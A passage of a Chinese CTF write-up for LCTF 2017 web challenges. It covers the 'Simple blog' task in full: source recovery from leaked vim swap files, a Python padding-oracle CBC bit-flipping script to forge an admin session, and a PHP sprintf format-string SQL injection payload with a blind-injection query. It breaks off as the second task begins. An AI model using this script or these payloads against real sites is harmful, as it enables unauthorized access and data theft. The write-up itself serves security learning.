@@ -1,0 +1,387 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>LCTF 2017 Web三题的WP及其思考</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>LCTF 2017 Web三题的WP及其思考</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484426&amp;idx=1&amp;sn=84fabc384912083e89f234783b92e999&amp;chksm=ec6fe30adb186a1c197fb51f462b8f7d27fbdd82f90897f4d03c4a97e91d88e375829f45bf12&amp;scene=126&amp;sessionid=1681378735#rd">http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484426&amp;idx=1&amp;sn=84fabc384912083e89f234783b92e999&amp;chksm=ec6fe30adb186a1c197fb51f462b8f7d27fbdd82f90897f4d03c4a97e91d88e375829f45bf12&amp;scene=126&amp;sessionid=1681378735#rd</a></blockquote><p><img data-s="300,640" data-type="png" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuicKh4hsY3JKbIUibqvPdf73bFzwEsHEibueqfnb4198adiaCbKyawbEMlQ/0?wx_fmt=png" data-copyright="0" style="" class="" data-ratio="0.5555555555555556" data-w="900" src="../Images/206a90ff7fa3272888c61049f858cd24.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuicKh4hsY3JKbIUibqvPdf73bFzwEsHEibueqfnb4198adiaCbKyawbEMlQ/0?wx_fmt=png"/></p><h1 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.6em;border-bottom: 1px solid rgb(221, 221, 221);">前言<br/></h1><p style="margin-bottom: 1.2em !important;">趁着期中考，复习累了做几道ctf玩玩，只做了3道web。感谢师傅们出的题！在这篇wp中我尽量将一些相关的知识点阐述清楚（其实就是废话很多的意思）。请师傅们珍惜自己的流量。先附上官方的wp：https://github.com/LCTF/LCTF2017 。另外在这篇水文中，我只写了三道题目的wp，里面涉及的一些经验和技巧跟大家分享分享。文章稍长，且自己水平太弱，若有出错，望大佬们指出。</p><p style="margin-bottom: 1.2em !important;">文章结构大概如下；</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">+ Simple blog
+    + Task
+    + Solution
+        + 源码泄露
+        + CBC翻转字节攻击
+        + 格式化串sql注入
+    + 小结
++ 他们有什么秘密呢
+    + Task
+    + Solution
+        + SQL注入
+        + PHP的命令执行
+    + 小结
++ 萌萌哒报名系统
+    + Task
+    + Solution
+        + 源码泄露
+        + 基本流程梳理
+        + php的preg_match
+        + php的is_file和readfile
+    + 小结</code></pre><h1 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.6em;border-bottom: 1px solid rgb(221, 221, 221);">Simple blog</h1><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">Task</h2><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">A simple blog .To discover the secret of it.
+http://111.231.111.54/</code></pre><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">Solution</h2><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">源码泄露</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">http://111.231.111.54/.login.php.swp
+http://111.231.111.54/.admin.php.swp</code></pre><p style="margin-bottom: 1.2em !important;">下载下来后，用<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">vim -r</code>恢复，得到源代码：</p><p style="margin-bottom: 1.2em !important;">login.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+error_reporting(0);
+session_start();
+define("METHOD", "aes-128-cbc");
+include('config.php');
+
+function show_page(){
+    echo '省略';
+}
+
+function get_random_token(){
+    $random_token = '';
+    $str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
+    for($i = 0; $i &lt; 16; $i++){
+        $random_token .= substr($str, rand(1, 61), 1);
+    }
+    return $random_token;
+}
+
+function get_identity(){
+    global $id;
+    $token = get_random_token();
+    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
+    $_SESSION['id'] = base64_encode($c);
+    setcookie("token", base64_encode($token));
+    if($id === 'admin'){
+        $_SESSION['isadmin'] = 1;
+    }else{
+        $_SESSION['isadmin'] = 0;
+    }
+}
+
+function test_identity(){
+    if (isset($_SESSION['id'])) {
+        $c = base64_decode($_SESSION['id']);
+        $token = base64_decode($_COOKIE["token"]);
+        if($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){
+            if ($u === 'admin') {
+                $_SESSION['isadmin'] = 1;
+                return 1;
+            }
+        }else{
+            die("Error!");
+        }
+    }
+    return 0;
+}
+
+if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){
+    $username = mysql_real_escape_string($_POST['username']);
+    $password = $_POST['password'];
+    $result = mysql_query("select password from users where username='" . $username . "'", $con);
+    $row = mysql_fetch_array($result);
+    if($row['password'] === md5($password)){
+        get_identity();
+        header('location: ./admin.php');
+    }else{
+        die('Login failed.');
+    }
+}else{
+    if(test_identity()){
+        header('location: ./admin.php');
+    }else{
+        show_page();
+    }
+}
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">admin.php的源码后面放出。</p><p style="margin-bottom: 1.2em !important;">经过测试，存在账号和密码，分别为admin和admin。在login.php页面登陆后会跳转到admin.php。默认情况下，由于并非真实admin，在跳转后会显示you are not admin.</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">CBC翻转字节攻击</h3><p style="margin-bottom: 1.2em !important;">鉴于篇幅的原因，关于CBC翻转字节攻击这里就不多讲了。在观察login.php，以及加上一点点的社工后，可以发现跟NJCTF的某题神似。借网络的脚本，修改了一下，增加登陆页面的验证以及跑出token后的结束标志：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">import requests
+import base64
+url='http://111.231.111.54/login.php'
+N=16
+
+def inject_token(token):
+    header={"Cookie":"PHPSESSID="+phpsession+";token="+token}
+    result=requests.post(url,headers=header)
+    return result
+
+def xor(a, b):
+    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
+
+def pad(string,N):
+    l=len(string)
+    if l!=N:
+        return string+chr(N-l)*(N-l)
+
+def padding_oracle(N):
+    get=""
+    for i in xrange(1,N+1):
+        for j in xrange(0,256):
+            padding=xor(get,chr(i)*(i-1))
+            c=chr(0)*(16-i)+chr(j)+padding
+            result=inject_token(base64.b64encode(c))
+            if "Error!" not in result.content:
+                get=chr(j^i)+get
+                break
+    return get
+
+def login(url):
+    payload = {
+        "username":"admin",
+        "password":"admin"
+    }
+    coo1 = {
+        "PHPSESSID":"j297k7o6d8stcbvi2c23naj5j6"
+    }
+    r = requests.post(url,cookies=coo1,data=payload,allow_redirects=False)
+    token = r.headers['Set-Cookie'].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
+    session = "j297k7o6d8stcbvi2c23naj5j6"
+    return session, token
+
+while 1:
+    phpsession,token = login(url)
+
+    middle1=padding_oracle(N)
+    print middle1
+    print "\n"
+    if(len(middle1)+1==16):
+        for i in xrange(0,256):
+            middle=chr(i)+middle1
+            print "token:"+token
+            print "middle:"+middle
+            plaintext=xor(middle,token);
+            print "plaintext:"+plaintext
+            des=pad('admin',N)
+            tmp=""
+            print des.encode("base64")
+            for i in xrange(16):
+                tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))
+            print tmp.encode('base64')
+            result=inject_token(base64.b64encode(tmp))
+            # print result.content
+            if "Login Form" not in result.content and "Error" not in result.content:
+                print result.content
+                print "success"
+                exit()</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuyxjjC4zJpk1M2F5qibSfZyqfO416q97uEyq8Kvf3iahDw8yLxbAwcpLQ/0?wx_fmt=png" class="" data-ratio="0.6197530864197531" data-w="405" data-type="png" src="../Images/314c109361824e516141c7cea752cb9e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuyxjjC4zJpk1M2F5qibSfZyqfO416q97uEyq8Kvf3iahDw8yLxbAwcpLQ/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">得到:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">token  HGV8cWwzDgk2CBooPRYtXA==
+PHPSESSID  j297k7o6d8stcbvi2c23naj5j6</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuu2B8YaWNbhv5oyN4ReYZh3Boo77NABSjHLQ6iaLyL6xFMPrDfAMgVibw/0?wx_fmt=png" class="" data-ratio="0.4310189359783589" data-w="1109" data-type="png" src="../Images/03530ddd8c96a0b2db0e819605ff17d5.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuu2B8YaWNbhv5oyN4ReYZh3Boo77NABSjHLQ6iaLyL6xFMPrDfAMgVibw/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">成功进入后台。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">格式化串sql注入</h3><p style="margin-bottom: 1.2em !important;">这里放上admin.php的源码：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+error_reporting(0);
+session_start();
+include('config.php');
+
+if(!$_SESSION['isadmin']){
+    die('You are not admin');
+}
+
+if(isset($_GET['id'])){
+    $id = mysql_real_escape_string($_GET['id']);
+    if(isset($_GET['title'])){
+        $title = mysql_real_escape_string($_GET['title']);
+        $title = sprintf("AND title='%s'", $title);
+    }else{
+        $title = '';
+    }
+    $sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id);
+    $result = mysql_query($sql,$con);
+    $row = mysql_fetch_array($result);
+    if(isset($row['title'])&amp;&amp;isset($row['content'])){
+        echo "&lt;h1&gt;".$row['title']."&lt;/h1&gt;&lt;br&gt;".$row['content'];
+        die();
+    }else{
+        die("This article does not exist.");
+    }
+}
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">在看到sprintf后，可以很直接的联系到前阵子爆出的关于wordpress的格式化字符串SQL注入漏洞。传送门：从WordPress SQLi谈PHP格式化字符串问题（2017.11.01更新）</p><p style="margin-bottom: 1.2em !important;">基于泄露出的源码，添加一些变量打印语句，本地测试代码：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+$con = mysql_connect("localhost", "root", "root");
+
+if(isset($_GET['id'])){
+    print_r("GET[id] =&gt; ".$_GET['id']."&lt;/br&gt;");
+    $id = mysql_real_escape_string($_GET['id'],$con);
+    print_r("\$id =&gt; ".$id."&lt;/br&gt;");
+
+    if(isset($_GET['title'])){
+        print_r("GET[title] =&gt; ".$_GET['title']."&lt;/br&gt;");
+        $title = mysql_real_escape_string($_GET['title']);
+        print_r("escape string tile: \$title =&gt; ".$title."&lt;/br&gt;");
+        $title = sprintf("AND title='%s'", $title);
+        print_r("After first sprintf : \$title =&gt; ".$title."&lt;/br&gt;");
+    }else{
+        $title = '';
+    }
+
+    $sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id);
+    print_r("sql =&gt; ".$sql);
+}
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">payload:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">http://127.0.0.1:2500/index.php?id=1&amp;title=flag%1$'%20 or 1=1%23</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDusnsqGTzof7oHowdDvscicQhSjmZK9hEXCTKggNPiajGO7ia3UvYkz2icrg/0?wx_fmt=png" class="" data-ratio="0.35224586288416077" data-w="1269" data-type="png" src="../Images/2770ebad8be1c4cd92e045eb15bf01b5.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDusnsqGTzof7oHowdDvscicQhSjmZK9hEXCTKggNPiajGO7ia3UvYkz2icrg/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">观察传入的title参数。</p><p style="margin-bottom: 1.2em !important;">title传入的值为<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">flag%1$' or 1=1#</code>，经过<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">mysql_real_escape_string</code>，会使得单引号<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">'</code>前加上斜杠，也就是图片中的第四行：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">escape string tile: $title =&gt; flag%1$\' or 1=1#</code></pre><p style="margin-bottom: 1.2em !important;">接下来执行一次<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">sprintf("AND title='%s'", $title);</code>，也就是将前面得到的title值title值为：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">After first sprintf : $title =&gt; AND title='flag%1$\' or 1=1#'</code></pre><p style="margin-bottom: 1.2em !important;">接下来，又一次执行了<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">sprintf</code>：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">sprintf("SELECT * FROM article WHERE id='%s' AND title='flag%1$\' or 1=1#'", $id);</code></pre><p style="margin-bottom: 1.2em !important;">由于PHP的sprintf中，<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">%1$\</code>这样的语法，百分号<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">%</code>后面的数表示使用第几个参数，<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">$</code>后面的表示类型，常见的类型比如<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">s</code>表示字符串等等。比如<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">%1$s</code>，表示使用第一个参数，类型为字符串（%s）</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+// 注format中，为防止 $ 被转义，在前面加了转义符。对于sprintf来说，即 %1$s
+$format1 = "hello,%1\$s one&lt;br/&gt;";
+$format2 = "hello,%2\$s two&lt;br/&gt;";
+$format3 = "hello,%1\$\' three&lt;br/&gt;";
+$format4 = "hello,%\$\' four&lt;br/&gt;";
+
+print_r("format string 1 : ".$format1);
+print_r("Result: ".sprintf($format1,"chybeta-1","chybeta-2"));
+
+print_r("format string 2 : ".$format2);
+print_r("Result: ".sprintf($format2,"chybeta-1","chybeta-2"));
+
+print_r("format string 3 : ".$format3);
+print_r(sprintf($format3,"chybeta-1","chybeta-2"));
+
+print_r("format string 4 : ".$format4);
+print_r(sprintf($format4,"chybeta-1","chybeta-2"));
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuYuh0dicQYsmfUOpagUwPzaORENNAklfrjiaWXAwaUXPZBvQcfJBCMthg/0?wx_fmt=png" class="" data-ratio="0.4721951219512195" data-w="1025" data-type="png" src="../Images/c501a08ead72a1c857f235726bccf530.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDuYuh0dicQYsmfUOpagUwPzaORENNAklfrjiaWXAwaUXPZBvQcfJBCMthg/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">前两个示例是演示选择参数的用法。第三个和前两个比较，变成类型<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">%\</code>，会直接跳过不处理，并直接输出。第四个和第三个对比，少了参数选择，这会导致报错，无法正常打印。</p><p style="margin-bottom: 1.2em !important;">回到前面的sprintf</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">sprintf("SELECT * FROM article WHERE id='%s' AND title='flag%1$\' or 1=1#'", $id);</code></pre><p style="margin-bottom: 1.2em !important;">通过百分号后的1，选择了一个参数（即id）不会爆错。利用类型<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">%\</code>，使得跳过。而原本在<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">\</code>后面的单引号，由于前面斜杠被当作了sprintf的类型，得以成功逃逸。</p><p style="margin-bottom: 1.2em !important;">剩下的工作就是盲注了，比如：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">http://111.231.111.54/admin.php?id=1&amp;title=flag%1$'%20 or (SELECT%09GROUP_CONCAT(f14g)%09FROM%09web1.key) &lt; 255 #</code></pre><p style="margin-bottom: 1.2em !important;">脚本写得太丑，基于以前的写的框架修改的，这里就不贴啦。</p><p style="margin-bottom: 1.2em !important;">最后注出来的表结构如下：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">数据库：web1 
+表名:key 
+字段名:f14g</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDu8yfTgmDVC1jf5sW0515QZQqRsuz4RlyJBKUbkibs9JZCuicuHaqFo7zw/0?wx_fmt=png" class="" data-ratio="0.21218961625282168" data-w="443" data-type="png" src="../Images/4dcb6ba9a51ce3e042ed048b2c228f4a.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoPDt2yLdmRhcPRhwADNlDu8yfTgmDVC1jf5sW0515QZQqRsuz4RlyJBKUbkibs9JZCuicuHaqFo7zw/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">flag:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">LCTF{N0!U_hacked_My_b1og}</code></pre><p style="margin-bottom: 1.2em !important;">回到PHP的sprintf中，sprintf能吃掉<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">\</code>呢？在源码中，采用了case进行分类处理，而对于未知情况，则采取break。明显<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">%\</code>是未知情况，因此成功绕过。</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">小结</h2><ul style="" class=" list-paddingleft-2"><li><p>源码泄露</p></li><li><p>CBC翻转字节攻击</p></li><li><p>格式化串sql注入</p></li></ul><h1 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.6em;border-bottom: 1px solid rgb(221, 221, 221);">他们有什么秘密呢</h1><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">Task</h2><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">一个简单到不能再简单的......
